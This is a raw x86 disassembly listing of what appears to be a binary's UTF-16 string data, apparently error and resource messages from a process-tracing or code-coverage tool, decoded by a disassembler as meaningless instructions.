  408ac9:	add    BYTE PTR [esi+0x0],ch
  408acc:	popa   
  408acd:	add    BYTE PTR [edx+0x0],ah
  408ad0:	ins    BYTE PTR es:[edi],dx
  408ad1:	add    BYTE PTR [ebp+0x0],ah
  408ad4:	and    BYTE PTR [eax],al
  408ad6:	je     0x408ad8
  408ad8:	outs   dx,DWORD PTR ds:[esi]
  408ad9:	add    BYTE PTR [eax],ah
  408adb:	add    BYTE PTR [ecx+0x0],ah
  408ade:	je     0x408ae0
  408ae0:	je     0x408ae2
  408ae2:	popa   
  408ae3:	add    BYTE PTR [ebx+0x0],ah
  408ae6:	push   0x74002000
  408aeb:	add    BYTE PTR [edi+0x0],ch
  408aee:	and    BYTE PTR [eax],al
  408af0:	jo     0x408af2
  408af2:	jb     0x408af4
  408af4:	outs   dx,DWORD PTR ds:[esi]
  408af5:	add    BYTE PTR [ebx+0x0],ah
  408af8:	add    BYTE PTR gs:[ebx+0x0],dh
  408afc:	jae    0x408afe
  408afe:	add    BYTE PTR [ecx],dh
  408b00:	inc    ebx
  408b01:	add    BYTE PTR [edi+0x0],ch
  408b04:	ins    BYTE PTR es:[edi],dx
  408b05:	add    BYTE PTR [eax+eax*1+0x65],ch
  408b09:	add    BYTE PTR [ebx+0x0],ah
  408b0c:	je     0x408b0e
  408b0e:	imul   eax,DWORD PTR [eax],0x6e006f
  408b14:	inc    esi
  408b15:	add    BYTE PTR [ecx+0x0],ah
  408b18:	jne    0x408b1a
  408b1a:	ins    BYTE PTR es:[edi],dx
  408b1b:	add    BYTE PTR [eax+eax*1+0x20],dh
  408b1f:	add    BYTE PTR [ebx+0x0],bh
  408b22:	xor    BYTE PTR [eax],al
  408b24:	jge    0x408b26
  408b26:	cmp    al,BYTE PTR [eax]
  408b28:	and    BYTE PTR [eax],al
  408b2a:	jnp    0x408b2c
  408b2c:	xor    DWORD PTR [eax],eax
  408b2e:	jge    0x408b30
  408b30:	add    BYTE PTR [ecx+0x45],bl
  408b33:	add    BYTE PTR [eax+0x0],bh
  408b36:	arpl   WORD PTR [eax],ax
  408b38:	add    BYTE PTR gs:[eax+0x0],dh
  408b3c:	je     0x408b3e
  408b3e:	imul   eax,DWORD PTR [eax],0x6e006f
  408b44:	and    BYTE PTR [eax],al
  408b46:	je     0x408b48
  408b48:	push   0x6f007200
  408b4d:	add    BYTE PTR [edi+0x0],dh
  408b50:	outs   dx,BYTE PTR ds:[esi]
  408b51:	add    BYTE PTR [eax],ah
  408b53:	add    BYTE PTR [edi+0x0],dh
  408b56:	push   0x6e006500
  408b5b:	add    BYTE PTR [eax],ah
  408b5d:	add    BYTE PTR [eax+eax*1+0x72],dh
  408b61:	add    BYTE PTR [ecx+0x0],bh
  408b64:	imul   eax,DWORD PTR [eax],0x67006e
  408b6a:	and    BYTE PTR [eax],al
  408b6c:	je     0x408b6e
  408b6e:	outs   dx,DWORD PTR ds:[esi]
  408b6f:	add    BYTE PTR [eax],ah
  408b71:	add    BYTE PTR [ebx+0x0],dh
  408b74:	je     0x408b76
  408b76:	outs   dx,DWORD PTR ds:[esi]
  408b77:	add    BYTE PTR [eax+0x0],dh
  408b7a:	and    BYTE PTR [eax],al
  408b7c:	je     0x408b7e
  408b7e:	jb     0x408b80
  408b80:	popa   
  408b81:	add    BYTE PTR [ebx+0x0],ah
  408b84:	imul   eax,DWORD PTR [eax],0x67006e
  408b8a:	add    BYTE PTR [edi],dl
  408b8c:	jnp    0x408b8e
  408b8e:	xor    BYTE PTR [eax],al
  408b90:	jge    0x408b92
  408b92:	add    BYTE PTR cs:[eax+0x0],dh
  408b96:	jnp    0x408b98
  408b98:	xor    DWORD PTR [eax],eax
  408b9a:	jge    0x408b9c
  408b9c:	jnp    0x408b9e
  408b9e:	xor    al,BYTE PTR [eax]
  408ba0:	jge    0x408ba2
  408ba2:	add    BYTE PTR [edi],cl
  408ba4:	add    BYTE PTR cs:[ebx+0x0],al
  408ba8:	jbe    0x408baa
  408baa:	inc    esp
  408bab:	add    BYTE PTR [ecx+0x0],ah
  408bae:	je     0x408bb0
  408bb0:	popa   
  408bb1:	add    BYTE PTR [eax],al
  408bb3:	sbb    DWORD PTR [eax],esp
  408bb5:	add    BYTE PTR [ebx+0x0],bh
  408bb8:	xor    BYTE PTR [eax],al
  408bba:	sub    al,0x0
  408bbc:	xor    eax,0x20007d00
  408bc1:	add    BYTE PTR [eax+eax*1+0x20],bh
  408bc5:	add    BYTE PTR [ebx+0x0],bh
  408bc8:	xor    DWORD PTR [eax],eax
  408bca:	jge    0x408bcc
  408bcc:	add    BYTE PTR [ecx+0x2d],cl
  408bcf:	add    BYTE PTR ds:0x2d002d00,ch
  408bd5:	add    BYTE PTR ds:0x2d002d00,ch
  408bdb:	add    BYTE PTR ds:0x2d002d00,ch
  408be1:	add    BYTE PTR ds:0x2d002d00,ch
  408be7:	add    BYTE PTR ds:0x2d002d00,ch
  408bed:	add    BYTE PTR ds:0x2d002d00,ch
  408bf3:	add    BYTE PTR ds:0x2d002d00,ch
  408bf9:	add    BYTE PTR ds:0x2d002d00,ch
  408bff:	add    BYTE PTR ds:0x2d002d00,ch
  408c05:	add    BYTE PTR ds:0x2d002d00,ch
  408c0b:	add    BYTE PTR ds:0x2d002d00,ch
  408c11:	add    BYTE PTR ds:0x1002d00,ch
  408c17:	cmp    DWORD PTR [ebx+0x0],eax
  408c1a:	popa   
  408c1b:	add    BYTE PTR [esi+0x0],ch
  408c1e:	outs   dx,BYTE PTR ds:[esi]
  408c1f:	add    BYTE PTR [edi+0x0],ch
  408c22:	je     0x408c24
  408c24:	and    BYTE PTR [eax],al
  408c26:	data16 add BYTE PTR [ecx+0x0],ch
  408c2a:	outs   dx,BYTE PTR ds:[esi]
  408c2b:	add    BYTE PTR [eax+eax*1+0x20],ah
  408c2f:	add    BYTE PTR [eax+eax*1+0x72],dh
  408c33:	add    BYTE PTR [ecx+0x0],ah
  408c36:	arpl   WORD PTR [eax],ax
  408c38:	add    BYTE PTR gs:[eax],ah
  408c3b:	add    BYTE PTR [esi+0x0],ah
  408c3e:	imul   eax,DWORD PTR [eax],0x65006c
  408c44:	and    BYTE PTR [eax],al
  408c46:	daa    
  408c47:	add    BYTE PTR [ebx+0x0],bh
  408c4a:	xor    BYTE PTR [eax],al
  408c4c:	jge    0x408c4e
  408c4e:	daa    
  408c4f:	add    BYTE PTR [ecx],al
  408c51:	adc    eax,0x30007b
  408c56:	jge    0x408c58
  408c58:	and    BYTE PTR [eax],al
  408c5a:	jnp    0x408c5c
  408c5c:	xor    DWORD PTR [eax],eax
  408c5e:	cmp    al,BYTE PTR [eax]
  408c60:	jo     0x408c62
  408c62:	xor    BYTE PTR [eax],al
  408c64:	jge    0x408c66
  408c66:	add    BYTE PTR [ebx+0x55],al
  408c69:	add    BYTE PTR [esi+0x0],ch
  408c6c:	popa   
  408c6d:	add    BYTE PTR [edx+0x0],ah
  408c70:	ins    BYTE PTR es:[edi],dx
  408c71:	add    BYTE PTR [ebp+0x0],ah
  408c74:	and    BYTE PTR [eax],al
  408c76:	je     0x408c78
  408c78:	outs   dx,DWORD PTR ds:[esi]
  408c79:	add    BYTE PTR [eax],ah
  408c7b:	add    BYTE PTR [edi+0x0],ah
  408c7e:	add    BYTE PTR gs:[eax+eax*1+0x20],dh
  408c83:	add    BYTE PTR [esi+0x0],ah
  408c86:	jne    0x408c88
  408c88:	ins    BYTE PTR es:[edi],dx
  408c89:	add    BYTE PTR [eax+eax*1+0x20],ch
  408c8d:	add    BYTE PTR [eax+0x0],dh
  408c90:	popa   
  408c91:	add    BYTE PTR [eax+eax*1+0x68],dh
  408c95:	add    BYTE PTR [eax],ah
  408c97:	add    BYTE PTR [esi+0x0],ah
  408c9a:	outs   dx,DWORD PTR ds:[esi]
  408c9b:	add    BYTE PTR [edx+0x0],dh
  408c9e:	and    BYTE PTR [eax],al
  408ca0:	daa    
  408ca1:	add    BYTE PTR [ebx+0x0],bh
  408ca4:	xor    BYTE PTR [eax],al
  408ca6:	jge    0x408ca8
  408ca8:	daa    
  408ca9:	add    BYTE PTR [ecx],al
  408cab:	sub    DWORD PTR [ebp+0x0],edx
  408cae:	outs   dx,BYTE PTR ds:[esi]
  408caf:	add    BYTE PTR [ebp+0x0],ah
  408cb2:	js     0x408cb4
  408cb4:	jo     0x408cb6
  408cb6:	add    BYTE PTR gs:[ebx+0x0],ah
  408cba:	je     0x408cbc
  408cbc:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  408cc1:	add    BYTE PTR [edi+0x0],ch
  408cc4:	jo     0x408cc6
  408cc6:	add    BYTE PTR gs:[edx+0x0],dh
  408cca:	popa   
  408ccb:	add    BYTE PTR [eax+eax*1+0x69],dh
  408ccf:	add    BYTE PTR [edi+0x0],ch
  408cd2:	outs   dx,BYTE PTR ds:[esi]
  408cd3:	add    BYTE PTR [eax],al
  408cd5:	push   ebx
  408cd6:	dec    ebp
  408cd7:	add    BYTE PTR [edi+0x0],ch
  408cda:	jb     0x408cdc
  408cdc:	add    BYTE PTR gs:[eax],ah
  408cdf:	add    BYTE PTR [eax+eax*1+0x68],dh
  408ce3:	add    BYTE PTR [ecx+0x0],ah
  408ce6:	outs   dx,BYTE PTR ds:[esi]
  408ce7:	add    BYTE PTR [eax],ah
  408ce9:	add    BYTE PTR [edi+0x0],ch
  408cec:	outs   dx,BYTE PTR ds:[esi]
  408ced:	add    BYTE PTR [ebp+0x0],ah
  408cf0:	and    BYTE PTR [eax],al
  408cf2:	jo     0x408cf4
  408cf4:	jb     0x408cf6
  408cf6:	outs   dx,DWORD PTR ds:[esi]
  408cf7:	add    BYTE PTR [ebx+0x0],ah
  408cfa:	add    BYTE PTR gs:[ebx+0x0],dh
  408cfe:	jae    0x408d00
  408d00:	and    BYTE PTR [eax],al
  408d02:	push   0x76006100
  408d07:	add    BYTE PTR [ebp+0x0],ah
  408d0a:	and    BYTE PTR [eax],al
  408d0c:	je     0x408d0e
  408d0e:	push   0x20006500
  408d13:	add    BYTE PTR [esi+0x0],ch
  408d16:	popa   
  408d17:	add    BYTE PTR [ebp+0x0],ch
  408d1a:	add    BYTE PTR gs:[eax],ah
  408d1d:	add    BYTE PTR [edi],ah
  408d1f:	add    BYTE PTR [ebx+0x0],bh
  408d22:	xor    BYTE PTR [eax],al
  408d24:	jge    0x408d26
  408d26:	daa    
  408d27:	add    BYTE PTR [ecx],al
  408d29:	inc    ecx
  408d2a:	dec    esi
  408d2b:	add    BYTE PTR [edi+0x0],ch
  408d2e:	and    BYTE PTR [eax],al
  408d30:	jo     0x408d32
  408d32:	jb     0x408d34
  408d34:	outs   dx,DWORD PTR ds:[esi]
  408d35:	add    BYTE PTR [ebx+0x0],ah
  408d38:	add    BYTE PTR gs:[ebx+0x0],dh
  408d3c:	jae    0x408d3e
  408d3e:	add    BYTE PTR gs:[ebx+0x0],dh
  408d42:	and    BYTE PTR [eax],al
  408d44:	push   0x76006100
  408d49:	add    BYTE PTR [ebp+0x0],ah
  408d4c:	and    BYTE PTR [eax],al
  408d4e:	je     0x408d50
  408d50:	push   0x20006500
  408d55:	add    BYTE PTR [esi+0x0],ch
  408d58:	popa   
  408d59:	add    BYTE PTR [ebp+0x0],ch
  408d5c:	add    BYTE PTR gs:[eax],ah
  408d5f:	add    BYTE PTR [edi],ah
  408d61:	add    BYTE PTR [ebx+0x0],bh
  408d64:	xor    BYTE PTR [eax],al
  408d66:	jge    0x408d68
  408d68:	daa    
  408d69:	add    BYTE PTR [ecx],al
  408d6b:	inc    edi
  408d6c:	push   ebp
  408d6d:	add    BYTE PTR [esi+0x0],ch
  408d70:	popa   
  408d71:	add    BYTE PTR [edx+0x0],ah
  408d74:	ins    BYTE PTR es:[edi],dx
  408d75:	add    BYTE PTR [ebp+0x0],ah
  408d78:	and    BYTE PTR [eax],al
  408d7a:	je     0x408d7c
  408d7c:	outs   dx,DWORD PTR ds:[esi]
  408d7d:	add    BYTE PTR [eax],ah
  408d7f:	add    BYTE PTR [ebx+0x0],dh
  408d82:	je     0x408d84
  408d84:	popa   
  408d85:	add    BYTE PTR [edx+0x0],dh
  408d88:	je     0x408d8a
  408d8a:	and    BYTE PTR [eax],al
  408d8c:	je     0x408d8e
  408d8e:	push   0x20006500
  408d93:	add    BYTE PTR [ebx+0x0],dh
  408d96:	add    BYTE PTR gs:[edx+0x0],dh
  408d9a:	jbe    0x408d9c
  408d9c:	imul   eax,DWORD PTR [eax],0x650063
  408da2:	and    BYTE PTR [eax],al
  408da4:	jo     0x408da6
  408da6:	jb     0x408da8
  408da8:	outs   dx,DWORD PTR ds:[esi]
  408da9:	add    BYTE PTR [ebx+0x0],ah
  408dac:	add    BYTE PTR gs:[ebx+0x0],dh
  408db0:	jae    0x408db2
  408db2:	add    BYTE PTR [ebx],ch
  408db4:	dec    ecx
  408db5:	add    BYTE PTR [esi+0x0],ch
  408db8:	jbe    0x408dba
  408dba:	popa   
  408dbb:	add    BYTE PTR [eax+eax*1+0x69],ch
  408dbf:	add    BYTE PTR [eax+eax*1+0x20],ah
  408dc3:	add    BYTE PTR [ebx+0x0],ah
  408dc6:	ins    BYTE PTR es:[edi],dx
  408dc7:	add    BYTE PTR [ecx+0x0],ch
  408dca:	add    BYTE PTR gs:[esi+0x0],ch
  408dce:	je     0x408dd0
  408dd0:	and    BYTE PTR [eax],al
  408dd2:	jae    0x408dd4
  408dd4:	je     0x408dd6
  408dd6:	popa   
  408dd7:	add    BYTE PTR [eax+eax*1+0x65],dh
  408ddb:	add    BYTE PTR [esi],ch
  408ddd:	add    BYTE PTR [eax],al
  408ddf:	or     BYTE PTR [ebp+0x610043],0x6e
  408de6:	add    BYTE PTR [esi+0x0],ch
  408de9:	outs   dx,DWORD PTR ds:[esi]
  408dea:	add    BYTE PTR [eax+eax*1+0x20],dh
  408dee:	add    BYTE PTR [ebx+0x0],dh
  408df1:	je     0x408df3
  408df3:	popa   
  408df4:	add    BYTE PTR [edx+0x0],dh
  408df7:	je     0x408df9
  408df9:	and    BYTE PTR [eax],al
  408dfb:	arpl   WORD PTR [eax],ax
  408dfd:	outs   dx,DWORD PTR ds:[esi]
  408dfe:	add    BYTE PTR [eax+eax*1+0x6c],ch
  408e02:	add    BYTE PTR [ebp+0x0],ah
  408e05:	arpl   WORD PTR [eax],ax
  408e07:	je     0x408e09
  408e09:	imul   eax,DWORD PTR [eax],0x6e006f
  408e0f:	and    BYTE PTR [eax],al
  408e11:	bound  eax,QWORD PTR [eax]
  408e13:	add    BYTE PTR gs:[ebx+0x0],ah
  408e17:	popa   
  408e18:	add    BYTE PTR [ebp+0x0],dh
  408e1b:	jae    0x408e1d
  408e1d:	add    BYTE PTR gs:[eax],ah
  408e20:	add    BYTE PTR [ebx+0x0],dh
  408e23:	add    BYTE PTR gs:[edx+0x0],dh
  408e27:	jbe    0x408e29
  408e29:	imul   eax,DWORD PTR [eax],0x650063
  408e2f:	and    BYTE PTR [eax],al
  408e31:	arpl   WORD PTR [eax],ax
  408e33:	ins    BYTE PTR es:[edi],dx
  408e34:	add    BYTE PTR [ecx+0x0],ch
  408e37:	add    BYTE PTR gs:[esi+0x0],ch
  408e3b:	je     0x408e3d
  408e3d:	and    BYTE PTR [eax],al
  408e3f:	imul   eax,DWORD PTR [eax],0x200073
  408e45:	imul   eax,DWORD PTR [eax],0x20006e
  408e4b:	popa   
  408e4c:	add    BYTE PTR [esi+0x0],ch
  408e4f:	and    BYTE PTR [eax],al
  408e51:	imul   eax,DWORD PTR [eax],0x76006e
  408e57:	popa   
  408e58:	add    BYTE PTR [eax+eax*1+0x69],ch
  408e5c:	add    BYTE PTR [eax+eax*1+0x20],ah
  408e60:	add    BYTE PTR [ebx+0x0],dh
  408e63:	je     0x408e65
  408e65:	popa   
  408e66:	add    BYTE PTR [eax+eax*1+0x65],dh
  408e6a:	add    BYTE PTR [esi],ch
  408e6c:	add    BYTE PTR [eax],al
  408e6e:	das    
  408e6f:	push   ebx
  408e70:	add    BYTE PTR [eax+eax*1+0x61],dh
  408e74:	add    BYTE PTR [edx+0x0],dh
  408e77:	je     0x408e79
  408e79:	imul   eax,DWORD PTR [eax],0x67006e
  408e7f:	and    BYTE PTR [eax],al
  408e81:	je     0x408e83
  408e83:	jb     0x408e85
  408e85:	popa   
  408e86:	add    BYTE PTR [ebx+0x0],ah
  408e89:	imul   eax,DWORD PTR [eax],0x67006e
  408e8f:	and    BYTE PTR [eax],al
  408e91:	data16 add BYTE PTR [ecx+0x0],ah
  408e95:	imul   eax,DWORD PTR [eax],0x65006c
  408e9b:	add    BYTE PTR fs:[eax],al
  408e9e:	sub    eax,0x740053
  408ea3:	popa   
  408ea4:	add    BYTE PTR [edx+0x0],dh
  408ea7:	je     0x408ea9
  408ea9:	imul   eax,DWORD PTR [eax],0x67006e
  408eaf:	and    BYTE PTR [eax],al
  408eb1:	je     0x408eb3
  408eb3:	popa   
  408eb4:	add    BYTE PTR [edx+0x0],dh
  408eb7:	add    BYTE PTR [di+0x0],ah
  408ebb:	je     0x408ebd
  408ebd:	and    BYTE PTR [eax],al
  408ebf:	data16 add BYTE PTR [ecx+0x0],ah
  408ec3:	imul   eax,DWORD PTR [eax],0x65006c
  408ec9:	add    BYTE PTR fs:[eax],al
  408ecc:	jno    0x408f1b
  408ece:	add    BYTE PTR [ecx+0x0],ch
  408ed1:	arpl   WORD PTR [eax],ax
  408ed3:	jb     0x408ed5
  408ed5:	outs   dx,DWORD PTR ds:[esi]
  408ed6:	add    BYTE PTR [ebx+0x0],dh
  408ed9:	outs   dx,DWORD PTR ds:[esi]
  408eda:	add    BYTE PTR [esi+0x0],ah
  408edd:	je     0x408edf
  408edf:	add    BYTE PTR cs:[ebx+0x0],al
  408ee3:	outs   dx,DWORD PTR ds:[esi]
  408ee4:	add    BYTE PTR [esi+0x0],ch
  408ee7:	arpl   WORD PTR [eax],ax
  408ee9:	jne    0x408eeb
  408eeb:	jb     0x408eed
  408eed:	jb     0x408eef
  408eef:	add    BYTE PTR gs:[esi+0x0],ch
  408ef3:	arpl   WORD PTR [eax],ax
  408ef5:	jns    0x408ef7
  408ef7:	push   esi
  408ef8:	add    BYTE PTR [ecx+0x0],ch
  408efb:	jae    0x408efd
  408efd:	jne    0x408eff
  408eff:	popa   
  408f00:	add    BYTE PTR [eax+eax*1+0x69],ch
  408f04:	add    BYTE PTR [edx+0x0],bh
  408f07:	add    BYTE PTR gs:[edx+0x0],dh
  408f0b:	add    BYTE PTR cs:[ebx+0x0],al
  408f0f:	outs   dx,DWORD PTR ds:[esi]
  408f10:	add    BYTE PTR [ebp+0x0],ch
  408f13:	ins    DWORD PTR es:[edi],dx
  408f14:	add    BYTE PTR [ecx+0x0],ah
  408f17:	outs   dx,BYTE PTR ds:[esi]
  408f18:	add    BYTE PTR [eax+eax*1+0x4c],ah
  408f1c:	add    BYTE PTR [ecx+0x0],ch
  408f1f:	outs   dx,BYTE PTR ds:[esi]
  408f20:	add    BYTE PTR [ebp+0x0],ah
  408f23:	add    BYTE PTR cs:[ebx+0x0],al
  408f27:	ins    DWORD PTR es:[edi],dx
  408f28:	add    BYTE PTR [eax+eax*1+0x52],ah
  408f2c:	add    BYTE PTR [ebp+0x0],ah
  408f2f:	jae    0x408f31
  408f31:	outs   dx,DWORD PTR ds:[esi]
  408f32:	add    BYTE PTR [ebp+0x0],dh
  408f35:	jb     0x408f37
  408f37:	arpl   WORD PTR [eax],ax
  408f39:	add    BYTE PTR gs:[ebx+0x0],dh
  408f3d:	add    BYTE PTR [edi],bh
  408f3f:	inc    ecx
  408f40:	add    BYTE PTR [esi+0x0],ch
  408f43:	popa   
  408f44:	add    BYTE PTR [eax+eax*1+0x79],ch
  408f48:	add    BYTE PTR [edx+0x0],bh
  408f4b:	add    BYTE PTR gs:[ebx+0x0],al
  408f4f:	popa   
  408f50:	add    BYTE PTR [esi+0x0],ch
  408f53:	je     0x408f55
  408f55:	inc    esi
  408f56:	add    BYTE PTR [ecx+0x0],ch
  408f59:	outs   dx,BYTE PTR ds:[esi]
  408f5a:	add    BYTE PTR [eax+eax*1+0x53],ah
  408f5e:	add    BYTE PTR [eax+0x0],dh
  408f61:	add    BYTE PTR gs:[ebx+0x0],ah
  408f65:	imul   eax,DWORD PTR [eax],0x690066
  408f6b:	add    BYTE PTR gs:[eax+eax*1+0x50],ah
  408f70:	add    BYTE PTR [edx+0x0],dh
  408f73:	outs   dx,DWORD PTR ds:[esi]
  408f74:	add    BYTE PTR [ebx+0x0],ah
  408f77:	add    BYTE PTR gs:[ebx+0x0],dh
  408f7b:	jae    0x408f7d
  408f7d:	add    BYTE PTR [edi],bl
  408f7f:	inc    ecx
  408f80:	add    BYTE PTR [esi+0x0],ch
  408f83:	popa   
  408f84:	add    BYTE PTR [eax+eax*1+0x79],ch
  408f88:	add    BYTE PTR [edx+0x0],bh
  408f8b:	add    BYTE PTR gs:[ebx+0x0],al
  408f8f:	outs   dx,DWORD PTR ds:[esi]
  408f90:	add    BYTE PTR [ebp+0x0],ch
  408f93:	jo     0x408f95
  408f95:	ins    BYTE PTR es:[edi],dx
  408f96:	add    BYTE PTR [ebp+0x0],ah
  408f99:	je     0x408f9b
  408f9b:	add    BYTE PTR gs:[eax],al
  408f9e:	aaa    
  408f9f:	inc    ecx
  408fa0:	add    BYTE PTR [esi+0x0],ch
  408fa3:	popa   
  408fa4:	add    BYTE PTR [eax+eax*1+0x79],ch
  408fa8:	add    BYTE PTR [edx+0x0],bh
  408fab:	add    BYTE PTR gs:[ebp+0x0],al
  408faf:	jb     0x408fb1
  408fb1:	jb     0x408fb3
  408fb3:	outs   dx,DWORD PTR ds:[esi]
  408fb4:	add    BYTE PTR [edx+0x0],dh
  408fb7:	inc    esi
  408fb8:	add    BYTE PTR [ecx+0x0],ch
  408fbb:	ins    BYTE PTR es:[edi],dx
  408fbc:	add    BYTE PTR [ebp+0x0],ah
  408fbf:	inc    esp
  408fc0:	add    BYTE PTR [edi+0x0],ch
  408fc3:	add    BYTE PTR gs:[ebx+0x0],dh
  408fc7:	outs   dx,BYTE PTR ds:[esi]
  408fc8:	add    BYTE PTR [eax+eax*1+0x45],dh
  408fcc:	add    BYTE PTR [eax+0x0],bh
  408fcf:	imul   eax,DWORD PTR [eax],0x740073
  408fd5:	add    BYTE PTR [ebx],bh
  408fd7:	inc    ecx
  408fd8:	add    BYTE PTR [esi+0x0],ch
  408fdb:	popa   
  408fdc:	add    BYTE PTR [eax+eax*1+0x79],ch
  408fe0:	add    BYTE PTR [edx+0x0],bh
  408fe3:	add    BYTE PTR gs:[ebp+0x0],al
  408fe7:	jb     0x408fe9
  408fe9:	jb     0x408feb
  408feb:	outs   dx,DWORD PTR ds:[esi]
  408fec:	add    BYTE PTR [edx+0x0],dh
  408fef:	push   edx
  408ff0:	add    BYTE PTR [ebp+0x0],ah
  408ff3:	jno    0x408ff5
  408ff5:	jne    0x408ff7
  408ff7:	imul   eax,DWORD PTR [eax],0x650072
  408ffd:	jae    0x408fff
  408fff:	push   ebx
  409000:	add    BYTE PTR [ecx+0x0],ch
  409003:	outs   dx,BYTE PTR ds:[esi]
  409004:	add    BYTE PTR [edi+0x0],ah
  409007:	ins    BYTE PTR es:[edi],dx
  409008:	add    BYTE PTR [ebp+0x0],ah
  40900b:	push   eax
  40900c:	add    BYTE PTR [ecx+0x0],ch
  40900f:	add    BYTE PTR fs:[eax],al
  409012:	xor    DWORD PTR [ecx+0x0],eax
  409015:	outs   dx,BYTE PTR ds:[esi]
  409016:	add    BYTE PTR [ecx+0x0],ah
  409019:	ins    BYTE PTR es:[edi],dx
  40901a:	add    BYTE PTR [ecx+0x0],bh
  40901d:	jp     0x40901f
  40901f:	add    BYTE PTR gs:[ebp+0x0],al
  409023:	jb     0x409025
  409025:	jb     0x409027
  409027:	outs   dx,DWORD PTR ds:[esi]
  409028:	add    BYTE PTR [edx+0x0],dh
  40902b:	push   esp
  40902c:	add    BYTE PTR [edx+0x0],dh
  40902f:	popa   
  409030:	add    BYTE PTR [ebx+0x0],ah
  409033:	add    BYTE PTR gs:[ecx+0x0],cl
  409037:	outs   dx,BYTE PTR ds:[esi]
  409038:	add    BYTE PTR [esi+0x0],dh
  40903b:	popa   
  40903c:	add    BYTE PTR [eax+eax*1+0x69],ch
  409040:	add    BYTE PTR [eax+eax*1+0x0],ah
  409044:	dec    ebx
  409045:	inc    ecx
  409046:	add    BYTE PTR [esi+0x0],ch
  409049:	popa   
  40904a:	add    BYTE PTR [eax+eax*1+0x79],ch
  40904e:	add    BYTE PTR [edx+0x0],bh
  409051:	add    BYTE PTR gs:[eax+0x0],dl
  409055:	jb     0x409057
  409057:	outs   dx,DWORD PTR ds:[esi]
  409058:	add    BYTE PTR [ebx+0x0],ah
  40905b:	add    BYTE PTR gs:[ebx+0x0],dh
  40905f:	jae    0x409061
  409061:	inc    ecx
  409062:	add    BYTE PTR [edx+0x0],dh
  409065:	add    BYTE PTR [bp+0x0],cl
  409069:	outs   dx,DWORD PTR ds:[esi]
  40906a:	add    BYTE PTR [eax+eax*1+0x53],dh
  40906e:	add    BYTE PTR [ebp+0x0],dh
  409071:	jo     0x409073
  409073:	jo     0x409075
  409075:	outs   dx,DWORD PTR ds:[esi]
  409076:	add    BYTE PTR [edx+0x0],dh
  409079:	je     0x40907b
  40907b:	add    BYTE PTR gs:[eax+eax*1+0x46],ah
  409080:	add    BYTE PTR [edi+0x0],ch
  409083:	jb     0x409085
  409085:	push   esp
  409086:	add    BYTE PTR [edx+0x0],dh
  409089:	popa   
  40908a:	add    BYTE PTR [ebx+0x0],ah
  40908d:	add    BYTE PTR gs:[eax],al
  409090:	inc    ebp
  409091:	inc    ecx
  409092:	add    BYTE PTR [esi+0x0],ch
  409095:	popa   
  409096:	add    BYTE PTR [eax+eax*1+0x79],ch
  40909a:	add    BYTE PTR [edx+0x0],bh
  40909d:	add    BYTE PTR gs:[ebx+0x0],dl
  4090a1:	jo     0x4090a3
  4090a3:	add    BYTE PTR gs:[ebx+0x0],ah
  4090a7:	imul   eax,DWORD PTR [eax],0x690066
  4090ad:	add    BYTE PTR gs:[eax+eax*1+0x50],ah
  4090b2:	add    BYTE PTR [edx+0x0],dh
  4090b5:	outs   dx,DWORD PTR ds:[esi]
  4090b6:	add    BYTE PTR [ebx+0x0],ah
  4090b9:	add    BYTE PTR gs:[ebx+0x0],dh
  4090bd:	jae    0x4090bf
  4090bf:	dec    ecx
  4090c0:	add    BYTE PTR [ebx+0x0],dh
  4090c3:	inc    ecx
  4090c4:	add    BYTE PTR [ebp+0x0],ch
  4090c7:	bound  eax,QWORD PTR [eax]
  4090c9:	imul   eax,DWORD PTR [eax],0x750067
  4090cf:	outs   dx,DWORD PTR ds:[esi]
  4090d0:	add    BYTE PTR [ebp+0x0],dh
  4090d3:	jae    0x4090d5
  4090d5:	add    BYTE PTR [edi],bl
  4090d7:	inc    ecx
  4090d8:	add    BYTE PTR [esi+0x0],ch
  4090db:	popa   
  4090dc:	add    BYTE PTR [eax+eax*1+0x79],ch
  4090e0:	add    BYTE PTR [edx+0x0],bh
  4090e3:	add    BYTE PTR gs:[ebx+0x0],dl
  4090e7:	je     0x4090e9
  4090e9:	popa   
  4090ea:	add    BYTE PTR [edx+0x0],dh
  4090ed:	je     0x4090ef
  4090ef:	imul   eax,DWORD PTR [eax],0x67006e
  4090f5:	add    BYTE PTR [ebx],dh
  4090f7:	inc    ecx
  4090f8:	add    BYTE PTR [esi+0x0],ch
  4090fb:	popa   
  4090fc:	add    BYTE PTR [eax+eax*1+0x79],ch
  409100:	add    BYTE PTR [edx+0x0],bh
  409103:	add    BYTE PTR gs:[edi+0x0],dl
  409107:	popa   
  409108:	add    BYTE PTR [edx+0x0],dh
  40910b:	outs   dx,BYTE PTR ds:[esi]
  40910c:	add    BYTE PTR [edi+0x0],dl
  40910f:	outs   dx,DWORD PTR ds:[esi]
  409110:	add    BYTE PTR [esi+0x0],ch
  409113:	je     0x409115
  409115:	push   edx
  409116:	add    BYTE PTR [ebp+0x0],ah
  409119:	ins    DWORD PTR es:[edi],dx
  40911a:	add    BYTE PTR [edi+0x0],ch
  40911d:	jbe    0x40911f
  40911f:	add    BYTE PTR gs:[ebp+0x0],al
  409123:	je     0x409125
  409125:	ins    BYTE PTR es:[edi],dx
  409126:	add    BYTE PTR [ebx+0x0],dh
  409129:	add    BYTE PTR [ebx],bl
  40912b:	inc    ecx
  40912c:	add    BYTE PTR [eax+0x0],dh
  40912f:	jo     0x409131
  409131:	dec    eax
  409132:	add    BYTE PTR [ebp+0x0],ah
  409135:	popa   
  409136:	add    BYTE PTR [eax+eax*1+0x65],ah
  40913a:	add    BYTE PTR [edx+0x0],dh
  40913d:	push   esp
  40913e:	add    BYTE PTR [ebp+0x0],ah
  409141:	js     0x409143
  409143:	je     0x409145
  409145:	add    BYTE PTR ds:0x740041,ch
  40914b:	je     0x40914d
  40914d:	popa   
  40914e:	add    BYTE PTR [ebx+0x0],ah
  409151:	push   0x75004f00
  409156:	add    BYTE PTR [eax+eax*1+0x70],dh
  40915a:	add    BYTE PTR [ebp+0x0],dh
  40915d:	je     0x40915f
  40915f:	inc    ebx
  409160:	add    BYTE PTR [ecx+0x0],ah
  409163:	outs   dx,BYTE PTR ds:[esi]
  409164:	add    BYTE PTR [eax+eax*1+0x41],dh
  409168:	add    BYTE PTR [eax+eax*1+0x74],dh
  40916c:	add    BYTE PTR [ecx+0x0],ah
  40916f:	arpl   WORD PTR [eax],ax
  409171:	push   0x41290000
  409176:	add    BYTE PTR [eax+eax*1+0x74],dh
  40917a:	add    BYTE PTR [ecx+0x0],ah
  40917d:	arpl   WORD PTR [eax],ax
  40917f:	push   0x75004f00
